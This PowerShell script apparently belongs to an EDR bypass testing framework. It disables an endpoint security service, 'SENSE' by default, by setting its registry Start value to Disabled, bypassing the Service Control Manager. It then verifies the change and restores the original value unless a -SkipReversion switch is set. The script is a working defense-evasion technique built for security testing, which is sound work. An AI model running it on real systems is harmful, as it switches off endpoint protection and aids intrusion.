#==============================================================================
# BP1002.5 - Disable EDR User-Mode Service via PowerShell Registry Manipulation
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by disabling EDR user-mode services using PowerShell
#   registry cmdlets to directly modify service registry keys, bypassing the
#   Service Control Manager, then reverts the configuration after verification.
#
# DESCRIPTION
#   This script implements BP-1002.5 technique which uses PowerShell registry
#   cmdlets to directly modify the service's Start value in the registry,
#   bypassing Service Control Manager protections. This technique can potentially
#   affect PPL-protected services if their registry keys are not additionally
#   protected. Changes take effect after system reboot.
#   
#   Test Flow:
#   1. Identify target EDR service
#   2. Backup current service registry configuration
#   3. Execute bypass: Set HKLM\SYSTEM\CurrentControlSet\Services\[service]\Start=4
#   4. Verify registry modification was successful
#   5. Revert configuration: restore original Start value
#   6. Verify reversion was successful
#   7. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for registry modifications)
#   - Windows Vista or later (service registry structure)
#   - Target service registry key must be accessible
#
# EXIT CODES
#   0 = Success (service disabled and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Registry modification failed
#   4 = Registry verification failed
#   5 = Registry reversion failed
#   6 = Target service not found
#   7 = Service registry key not accessible
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$TargetService = "SENSE",
    
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1002.5"
$TECHNIQUE_NAME = "Disable EDR User-Mode Service via PowerShell Registry Manipulation"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1002.5-registry"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# Service registry constants
$SERVICES_REGISTRY_PATH = "HKLM:\SYSTEM\CurrentControlSet\Services"
$START_VALUE_NAME = "Start"

# Service startup type constants (registry values)
$SERVICE_START_BOOT = 0        # Boot
$SERVICE_START_SYSTEM = 1      # System  
$SERVICE_START_AUTO = 2        # Automatic
$SERVICE_START_MANUAL = 3      # Manual
$SERVICE_START_DISABLED = 4    # Disabled
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Target Service: $TargetService" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-ServiceExists {
    param([string]$ServiceName)
    
    try {
        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        return ($service -ne $null)
    }
    catch {
        return $false
    }
}

function Get-ServiceRegistryPath {
    param([string]$ServiceName)
    
    return "$SERVICES_REGISTRY_PATH\$ServiceName"
}

function Test-ServiceRegistryAccess {
    param([string]$ServiceName)
    
    try {
        $servicePath = Get-ServiceRegistryPath -ServiceName $ServiceName
        Write-Log "Testing registry access for service path: $servicePath" -Level "DEBUG"
        
        if (Test-Path $servicePath) {
            # Try to read the registry key to verify access
            $startValue = Get-ItemProperty -Path $servicePath -Name $START_VALUE_NAME -ErrorAction SilentlyContinue
            if ($startValue) {
                Write-Log "Service registry key accessible with Start value: $($startValue.$START_VALUE_NAME)" -Level "DEBUG"
                return $true
            }
            else {
                Write-Log "Service registry key exists but Start value not found" -Level "WARN"
                return $true  # Key exists, we might be able to create the value
            }
        }
        else {
            Write-Log "Service registry key does not exist: $servicePath" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to access service registry key: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-ServiceRegistryConfiguration {
    param([string]$ServiceName)
    
    try {
        $servicePath = Get-ServiceRegistryPath -ServiceName $ServiceName
        Write-Log "Querying service registry configuration: $servicePath" -Level "DEBUG"
        
        if (-not (Test-Path $servicePath)) {
            Write-Log "Service registry path does not exist: $servicePath" -Level "ERROR"
            return $null
        }
        
        # Get service properties from registry
        $serviceKey = Get-ItemProperty -Path $servicePath -ErrorAction SilentlyContinue
        
        if (-not $serviceKey) {
            Write-Log "Failed to read service registry key" -Level "ERROR"
            return $null
        }
        
        # Get current service object for additional details
        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        
        $config = @{
            ServiceName = $ServiceName
            RegistryPath = $servicePath
            StartValue = $serviceKey.$START_VALUE_NAME
            DisplayName = $serviceKey.DisplayName
            ImagePath = $serviceKey.ImagePath
            Description = $serviceKey.Description
            ServiceStatus = if ($service) { $service.Status } else { "Unknown" }
            Exists = $true
        }
        
        # Convert Start value to human-readable format
        $startDescription = switch ($config.StartValue) {
            0 { "Boot" }
            1 { "System" }
            2 { "Automatic" }
            3 { "Manual" }
            4 { "Disabled" }
            default { "Unknown($($config.StartValue))" }
        }
        
        $config.StartDescription = $startDescription
        
        Write-Log "Service registry config - Name: $($config.ServiceName), Start: $($config.StartValue) ($startDescription)" -Level "DEBUG"
        Write-Log "Service registry details - Display: $($config.DisplayName), Status: $($config.ServiceStatus)" -Level "DEBUG"
        
        return $config
    }
    catch {
        Write-Log "Failed to get service registry configuration: $($_.Exception.Message)" -Level "ERROR"
        return $null
    }
}

function ConvertTo-StartTypeDescription {
    param([int]$StartValue)
    
    switch ($StartValue) {
        0 { return "Boot" }
        1 { return "System" }
        2 { return "Automatic" }
        3 { return "Manual" }
        4 { return "Disabled" }
        default { return "Unknown($StartValue)" }
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    param([string]$ServiceName)
    
    try {
        Write-Log "Backing up original service registry configuration..." -Level "INFO"
        
        $originalConfig = Get-ServiceRegistryConfiguration -ServiceName $ServiceName
        
        if (-not $originalConfig) {
            Write-Log "Failed to retrieve original service registry configuration" -Level "ERROR"
            return $false
        }
        
        $global:OriginalState = @{
            ServiceName = $ServiceName
            Configuration = $originalConfig
            BackupTime = Get-Date
        }
        
        Write-Log "Original service registry state backed up:" -Level "INFO"
        Write-Log "  Registry Path: $($originalConfig.RegistryPath)" -Level "INFO"
        Write-Log "  Start Value: $($originalConfig.StartValue) ($($originalConfig.StartDescription))" -Level "INFO"
        Write-Log "  Display Name: $($originalConfig.DisplayName)" -Level "INFO"
        Write-Log "  Service Status: $($originalConfig.ServiceStatus)" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-RegistryBypass {
    param([string]$ServiceName)
    
    try {
        $servicePath = Get-ServiceRegistryPath -ServiceName $ServiceName
        Write-Log "Executing registry bypass technique..." -Level "INFO"
        Write-Log "Target registry path: $servicePath" -Level "INFO"
        Write-Log "Setting Start value to: $SERVICE_START_DISABLED (Disabled)" -Level "INFO"
        
        # Set the Start value to 4 (Disabled) using PowerShell registry cmdlets
        Set-ItemProperty -Path $servicePath -Name $START_VALUE_NAME -Value $SERVICE_START_DISABLED -Type DWord -ErrorAction Stop
        
        Write-Log "Registry modification executed successfully" -Level "INFO"
        return $true
    }
    catch [System.Security.SecurityException] {
        Write-Log "Access denied - insufficient privileges for registry modification: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch [System.UnauthorizedAccessException] {
        Write-Log "Access denied - registry key may be protected: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch {
        Write-Log "Failed to execute registry bypass: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Exception type: $($_.Exception.GetType().Name)" -Level "DEBUG"
        return $false
    }
}

function Test-BypassSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying registry bypass was successful..." -Level "INFO"
        
        # Small delay to ensure registry changes are applied
        Start-Sleep -Seconds 1
        
        $currentConfig = Get-ServiceRegistryConfiguration -ServiceName $ServiceName
        
        if (-not $currentConfig) {
            Write-Log "Failed to retrieve current service registry configuration for verification" -Level "ERROR"
            return $false
        }
        
        # Check if Start value was set to Disabled (4)
        $isDisabled = ($currentConfig.StartValue -eq $SERVICE_START_DISABLED)
        
        Write-Log "Verification results:" -Level "INFO"
        Write-Log "  Current Start value: $($currentConfig.StartValue) ($($currentConfig.StartDescription))" -Level "INFO"
        Write-Log "  Service disabled: $isDisabled" -Level "INFO"
        
        if ($isDisabled) {
            Write-Log "Registry bypass verification successful - service Start value set to Disabled" -Level "INFO"
            Write-Log "Note: Service disable will be effective after system reboot" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Registry bypass verification failed - Start value not set to Disabled" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    param([string]$ServiceName)
    
    try {
        Write-Log "Reverting service registry to original state..." -Level "INFO"
        
        $originalConfig = $global:OriginalState.Configuration
        $originalStartValue = $originalConfig.StartValue
        $originalStartDescription = $originalConfig.StartDescription
        $servicePath = $originalConfig.RegistryPath
        
        Write-Log "Restoring original Start value: $originalStartValue ($originalStartDescription)" -Level "INFO"
        
        # Restore original Start value
        Set-ItemProperty -Path $servicePath -Name $START_VALUE_NAME -Value $originalStartValue -Type DWord -ErrorAction Stop
        
        Write-Log "Registry state reversion executed successfully" -Level "INFO"
        return $true
    }
    catch [System.Security.SecurityException] {
        Write-Log "Access denied during reversion - insufficient privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch [System.UnauthorizedAccessException] {
        Write-Log "Access denied during reversion - registry key may be protected: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch {
        Write-Log "Failed to revert registry state: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Exception type: $($_.Exception.GetType().Name)" -Level "DEBUG"
        return $false
    }
}

function Test-ReversionSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying registry state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure registry changes are applied
        Start-Sleep -Seconds 1
        
        $currentConfig = Get-ServiceRegistryConfiguration -ServiceName $ServiceName
        $originalConfig = $global:OriginalState.Configuration
        
        if (-not $currentConfig) {
            Write-Log "Failed to retrieve current service registry configuration for reversion verification" -Level "ERROR"
            return $false
        }
        
        # Check if Start value was restored
        $startValueRestored = ($currentConfig.StartValue -eq $originalConfig.StartValue)
        
        Write-Log "Reversion verification results:" -Level "INFO"
        Write-Log "  Current Start value: $($currentConfig.StartValue) ($($currentConfig.StartDescription))" -Level "INFO"
        Write-Log "  Original Start value: $($originalConfig.StartValue) ($($originalConfig.StartDescription))" -Level "INFO"
        Write-Log "  Start value restored: $startValueRestored" -Level "INFO"
        
        if ($startValueRestored) {
            Write-Log "Registry reversion verification successful - Start value restored" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Registry reversion verification failed - Start value not restored" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for registry modification operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check if target service exists
        if (-not (Test-ServiceExists -ServiceName $TargetService)) {
            $errorMsg = "Target service '$TargetService' not found on this system"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 6
        }
        Write-Log "Target service '$TargetService' found" -Level "INFO"
        
        # Check service registry access
        if (-not (Test-ServiceRegistryAccess -ServiceName $TargetService)) {
            $errorMsg = "Target service '$TargetService' registry key is not accessible"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 7
        }
        Write-Log "Service registry key access confirmed" -Level "INFO"
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Backup original state
        if (-not (Backup-OriginalState -ServiceName $TargetService)) {
            $errorMsg = "Failed to backup original service registry state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute registry bypass
        if (-not (Invoke-RegistryBypass -ServiceName $TargetService)) {
            $errorMsg = "Failed to execute registry bypass technique"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 3
        }
        
        # Verify bypass was successful
        if (-not (Test-BypassSuccess -ServiceName $TargetService)) {
            $errorMsg = "Registry bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 4
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        Write-Log "Service disabled via registry modification - effective after reboot" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING REGISTRY STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion -ServiceName $TargetService)) {
                $errorMsg = "Failed to revert registry state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            if (-not (Test-ReversionSuccess -ServiceName $TargetService)) {
                $errorMsg = "Registry state reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            Write-Log "Registry state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "Registry state reversion skipped as requested" -Level "WARN"
        }
        
        # Report success
        $successMsg = "BP1002.5 registry bypass technique executed successfully (service disabled via registry, effective after reboot)"
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            TargetService = $TargetService
            OriginalConfiguration = $global:OriginalState.Configuration
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            RegistryPath = (Get-ServiceRegistryPath -ServiceName $TargetService)
            BypassMethod = "Registry Start Value Modification"
            RebootRequired = $true
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        exit 1
    }
}

# Execute main function
main
#endregion